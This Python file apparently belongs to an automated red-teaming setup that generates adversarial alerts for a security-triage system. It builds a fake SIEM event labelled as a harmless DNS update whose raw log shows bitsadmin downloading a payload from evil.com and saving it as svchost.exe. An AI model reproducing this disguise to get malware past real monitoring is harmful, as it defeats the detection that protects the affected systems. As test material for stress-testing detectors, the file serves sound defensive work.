"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 15: bitsadmin transfer + dns_update evasion + phantom IPs
    return {
        "task_type": "dns_update",
        "severity": "info",
        "siem_event": {
            "title": "DNS Zone Update",
            "source_ip": "10.30.0.1",
            "destination_ip": "10.30.0.2",
            "username": "svc_dns",
            "hostname": "dns-srv-01",
            "rule_name": "DNSUpdate",
            "raw_log": (
                "EventID=4688 Process=bitsadmin.exe "
                "CommandLine=bitsadmin /transfer malware "
                "http://evil.com/payload.exe C:\\temp\\svchost.exe "
                "User=SYSTEM ParentProcess=cmd.exe"
            ),
        },
    }
